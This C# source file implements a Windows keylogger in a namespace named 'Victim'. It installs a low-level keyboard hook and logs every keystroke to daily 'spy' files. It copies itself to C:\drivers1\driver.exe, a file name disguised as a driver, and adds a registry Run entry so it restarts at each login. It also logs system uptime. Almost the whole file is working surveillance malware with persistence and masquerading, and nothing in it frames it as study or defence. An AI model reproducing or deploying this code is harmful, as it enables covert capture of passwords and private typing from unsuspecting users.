using System;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Victim
{
    class AI
    {
        private static bool Shift = false;
        private static bool Ctrl = false;
        private static bool CapsLock = false;
        private static bool Num = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static RegistryKey regS = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);// Editing registry for Auto-Opening. (path to the key where Windows looks for startup applications)
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [STAThread]
        public static void Init()
        {
            // info
            Thread open = new Thread(new ThreadStart(OpenF));
            Thread.Sleep(5000);
            open.Start();

            // end info

            _hookID = SetHook(_proc);
            if (!Directory.Exists(@"C:\drivers1"))
                Directory.CreateDirectory(@"C:\drivers1");

            if (!File.Exists(@"C:\drivers1\driver.exe"))
            {
                string exe = Application.ExecutablePath.ToString();
                File.Copy(exe, @"C:\drivers1\driver.exe", false);
            }

            if (regS.GetValue("MyApp") == null)
                regS.SetValue("MyApp", @"C:\drivers1\driver.exe"); //Creating the registry
            if (!Directory.Exists(@"C:\drivers1\key"))
                Directory.CreateDirectory(@"C:\drivers1\key");
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int codeNum, IntPtr wParam, IntPtr lParam)
        {
            if (codeNum >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                {
                    char s = (char)vkCode;
                    DateTime date = DateTime.Today;
                    int dDAY = date.Day;
                    int dMONTH = date.Month;
                    int dYEAR = date.Year;
                    string DATE = dDAY.ToString() + "." + dMONTH.ToString() + "." + dYEAR.ToString();
                    switch (vkCode)
                    {
                        case 13: // enter
                            Console.WriteLine();
                            File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[enter]");
                            break;
                        case 192: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "~");
                                Console.Write("~");
                                Shift = false;
                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "`");
                                Console.Write("`");
                            }
                            break;
                        case 49: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "!");
                                Console.Write("!");
                                Shift = false;


                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "1");
                                Console.Write("1");
                            }
                            break;
                        case 50: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "@");
                                Console.Write("@");
                                Shift = false;


                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "2");
                                Console.Write("2");

                            }
                            break;
                        case 51: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "#");
                                Console.Write("#");
                                Shift = false;

                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "3");
                                Console.Write("3");

                            }
                            break;
                        case 52: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "$");
                                Console.Write("$");
                                Shift = false;



                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "4");
                                Console.Write("4");

                            }
                            break;
                        case 53: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "%");
                                Console.Write("%");
                                Shift = false;



                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "5");
                                Console.Write("5");
                            }
                            break;
                        case 54: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "^");
                                Console.Write("^");
                                Shift = false;



                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "6");
                                Console.Write("6");

                            }
                            break;
                        case 55: // .
                            if (Shift)
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "&");
                                Console.Write("&");
                                Shift = false;


                            }
                            else
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "7");
                                Console.Write("7");
                            }
                            break;
                        case 56: // .
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "*");
                                    Console.Write("*");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "8");
                                    Console.Write("8");
                                }
                                break;
                            }

                        case 57: // .
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "(");
                                    Console.Write("(");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "9");
                                    Console.Write("9");
                                }
                                break;
                            }

                        case 48: // .
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ")");
                                    Console.Write(")");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "0");
                                    Console.Write("0");
                                }
                                break;
                            }

                        case 188: // .
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "<");
                                    Console.Write("<");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ",");
                                    Console.Write(",");
                                }
                                break;
                            }

                        case 190: // .
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ">");
                                    Console.Write(">");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ".");
                                    Console.Write(".");
                                }
                                break;
                            }

                        case 186: // :
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ":");
                                    Console.Write(":");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ";");
                                    Console.Write(";");
                                }


                                break;
                            }

                        case 191: // /
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "?");
                                    Console.Write("?");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "/");
                                    Console.Write("/");
                                }
                                break;
                            }

                        case 189: // -
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "_");
                                    Console.Write("_");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "-");
                                    Console.Write("-");
                                }
                                break;
                            }

                        case 187: // -
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "+");
                                    Console.Write("+");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "=");
                                    Console.Write("=");
                                }
                                break;
                            }

                        case 219: // [
                            {
                                if (Shift)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "{");
                                    Console.Write("{");
                                    Shift = false;

                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[");
                                    Console.Write("[");
                                }
                                break;
                            }

                        case 221: // ]
                            {
                                if (Shift)
                                {

                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "}");
                                    Console.Write("}");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "]");
                                    Console.Write("]");
                                }
                                break;
                            }

                        case 222: // -
                            {
                                if (Shift)
                                {
                                    char c = (char)34;
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", c.ToString());
                                    Console.Write(c.ToString());
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "'");
                                    Console.Write("'");
                                }
                                break;
                            }

                        case 220: // \
                            {
                                if (Shift)
                                {

                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "|");
                                    Console.Write("|");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", @"\");
                                    Console.Write(@"\");
                                }
                                break;
                            }

                        case 226: // ]
                            {
                                if (Shift)
                                {

                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "|");
                                    Console.Write("|");
                                    Shift = false;


                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", @"\");
                                    Console.Write(@"\");
                                }
                                break;
                            }


                        case 91: // windows
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[windows]");
                                Console.Write("[windows]");
                                break;
                            }

                        case 93: // space
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[RightClick]");
                                Console.Write("[RightClick]");
                                break;
                            }

                        case 96: // num 0
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "0");
                                    Console.Write("0");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[insert]");
                                    Console.Write("[insert]");
                                }

                                break;
                            }

                        case 97: // num 1
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "1");
                                    Console.Write("1");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[End]");
                                    Console.Write("[End]");
                                }

                                break;
                            }

                        case 98: // num 2
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "2");
                                    Console.Write("2");
                                }
                                else
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[downarrow]");
                                Console.Write("[downarrow]");
                                break;
                            }

                        case 99: // num 3
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "3");
                                    Console.Write("3");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[pagedown]");
                                    Console.Write("[pagedown]");
                                }
                                break;
                            }

                        case 100: // num 4
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "4");
                                    Console.Write("4");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[leftarrow]");
                                    Console.Write("[leftarrow]");
                                }
                                break;
                            }

                        case 101: // num 5
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "5");
                                    Console.Write("5");
                                }
                                break;
                            }

                        case 102: // num 6
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "6");
                                    Console.Write("6");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[rightarrow]");
                                    Console.Write("[rightarrow]");
                                }
                                break;
                            }

                        case 103: // num 7
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "7");
                                    Console.Write("7");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[home]");
                                    Console.Write("[home]");
                                }
                                break;
                            }

                        case 104: // num 8
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "8");
                                    Console.Write("8");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[uparrow]");
                                    Console.Write("[uparrow]");
                                }
                                break;
                            }

                        case 105: // num 9
                            {
                                if (Num)
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "9");
                                    Console.Write("9");
                                }
                                else
                                {
                                    File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[pageup]");
                                    Console.Write("[pageup]");
                                }
                                break;
                            }

                        case 110: // num .
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", ".");
                                Console.Write(".");
                                break;
                            }

                        case 107: // num +
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "+");
                                Console.Write("+");
                                break;
                            }

                        case 109: // num -
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "-");
                                Console.Write("-");
                                break;
                            }

                        case 106: // num *
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "*");
                                Console.Write("*");
                                break;
                            }

                        case 111: // num /
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "/");
                                Console.Write("/");
                                break;
                            }

                        case 45: // insert
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[insert]");
                                Console.Write("[insert]");
                                break;
                            }

                        case 144: // numlock
                            {
                                if (Num)
                                    Num = false;
                                else
                                    Num = true;
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[numlock]");
                                Console.Write("[numlock]");
                                break;
                            }
                        case 35: // end
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[End]");
                                Console.Write("[End]");
                                break;
                            }

                        case 40: // downarrow
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[downarrow]");
                                Console.Write("[downarrow]");
                                break;
                            }

                        case 34: // pagedown
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[pagedown]");
                                Console.Write("[pagedown]");
                                break;
                            }

                        case 37: // leftarrow
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[leftarrow]");
                                Console.Write("[leftarrow]");
                                break;
                            }

                        case 12: // nothing
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[nothing]");
                                Console.Write("[nothing]");
                                break;
                            }

                        case 39: // rightarrow
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[rightarrow]");
                                Console.Write("[rightarrow]");
                                break;
                            }

                        case 36: // home
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[home]");
                                Console.Write("[home]");
                                break;
                            }

                        case 38: // uparrow
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[uparrow]");
                                Console.Write("[uparrow]");
                                break;
                            }

                        case 33: // pageup
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[pageup]");
                                Console.Write("[pageup]");
                                break;
                            }

                        case 46: // delete
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[delete]");
                                Console.Write("[delete]");
                                break;
                            }

                        case 44: // prtscr
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[printscreen]");
                                Console.Write("[printscreen]");
                                break;
                            }

                        case 145: // scrlck
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[scrolllock]");
                                Console.Write("[scrolllock]");
                                break;
                            }

                        case 19: // pause
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[pause]");
                                Console.Write("[pause]");
                                break;
                            }

                        case 112: // F1
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F1]");
                                Console.Write("[F1]");
                                break;
                            }


                        case 113: // F2
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F2]");
                                Console.Write("[F2]");
                                break;
                            }

                        case 114: // F3
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F3]");
                                Console.Write("[F3]");
                                break;
                            }

                        case 115: // F4
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F4]");
                                Console.Write("[F4]");
                                break;
                            }

                        case 116: // F5
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F5]");
                                Console.Write("[F5]");
                                break;
                            }

                        case 117: // F6
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F6]");
                                Console.Write("[F6]");
                                break;
                            }

                        case 118: // F7
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F7]");
                                Console.Write("[F7]");
                                break;
                            }

                        case 119: // F8
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F8]");
                                Console.Write("[F8]");
                                break;
                            }

                        case 120: // F9
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F9]");
                                Console.Write("[F9]");
                                break;
                            }

                        case 121: // F10
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F10]");
                                Console.Write("[F10]");
                                break;
                            }

                        case 122: // F11
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F11]");
                                Console.Write("[F11]");
                                break;
                            }

                        case 123: // F12
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[F12]");
                                Console.Write("[F12]");
                                break;
                            }

                        case 27: // ESC
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[esc]");
                                Console.Write("[esc]");
                                break;
                            }


                        case 9: // TAB
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[tab]");
                                Console.Write("[tab]");
                                break;
                            }


                        case 32: // space
                            {

                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", " ");
                                Console.Write(" ");
                                break;
                            }

                        case 8: // BACKSPACE
                            {
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", "[backspace]");
                                Console.Write("[backspace]");

                                break;
                            }

                        case 162: // ctrl
                        case 163:
                            {
                                Ctrl = true;
                                break;
                            }

                        case 160: // shift
                        case 161:
                            {
                                Shift = true;
                                break;
                            }

                        case 20: // capslock
                            {
                                if (CapsLock)
                                {
                                    CapsLock = false;
                                }
                                else
                                {
                                    CapsLock = true;
                                }
                                break;
                            }

                        default:
                            {
                                int vkCodeL = vkCode + 32;

                                if ((CapsLock) || (Shift))
                                {
                                    s = (char)vkCode;
                                }
                                else
                                {
                                    s = (char)vkCodeL;
                                }

                                if (Shift)
                                {
                                    Shift = false;
                                }
                                File.AppendAllText(@"C:\drivers1\key\spy" + DATE + ".txt", s.ToString());
                                Console.Write(s);
                                break;
                            }
                    }

                }
            }
            return CallNextHookEx(_hookID, codeNum, wParam, lParam);
        }
        public static void OpenF()
        {
            DateTime d = new DateTime();
            d = DateTime.Today;
            int year = d.Year;
            int month = d.Month;
            int day = d.Day;
            string date = day.ToString() + "." + month + "." + year;


            while (true)
            {

                if (!Directory.Exists(@"C:\drivers1\super"))
                    Directory.CreateDirectory(@"C:\drivers1\super");
                if (!File.Exists(@"C:\drivers1\super\" + date + ".txt"))
                    File.Create(@"C:\drivers1\super\" + date + ".txt");


                double time = Environment.TickCount;
                time = time / 3600000;
                string HOURSs = time.ToString();
                int dot = HOURSs.IndexOf('.');
                if ((dot != -1) && (HOURSs.Length - 1 - dot > 5))
                    HOURSs = HOURSs.Substring(0, dot + 5);

                Hour(date, time, HOURSs);
            }
        }
                public static void Hour(string date, double t, string HOURSs)
        {
            try
            {
                if (File.ReadAllText(@"C:\drivers1\super\" + date + ".txt") != "")
                {
                    string w = File.ReadAllText(@"C:\drivers1\super\" + date + ".txt");
                    int p = File.ReadAllText(@"C:\drivers1\super\" + date + ".txt").LastIndexOf("#");

                    string last = File.ReadAllText(@"C:\drivers1\super\" + date + ".txt").Substring(p + 1);

                    if (t < double.Parse(last))
                    {
                        File.AppendAllText(@"C:\drivers1\super\" + date + ".txt", "#" + HOURSs);
                    }
                    else
                    {
                        File.WriteAllText(@"C:\drivers1\super\" + date + ".txt", File.ReadAllText(@"C:\drivers1\super\" + date + ".txt").Replace(last, HOURSs));
                    }
                }
                else
                    File.AppendAllText(@"C:\drivers1\super\" + date + ".txt", "#" + HOURSs);
            }
            catch
            {
                Thread.Sleep(1);
                Hour(date, t, HOURSs);
            }
            finally
            {
                Thread.Sleep(5000);
            }
        }


            }
        }
    
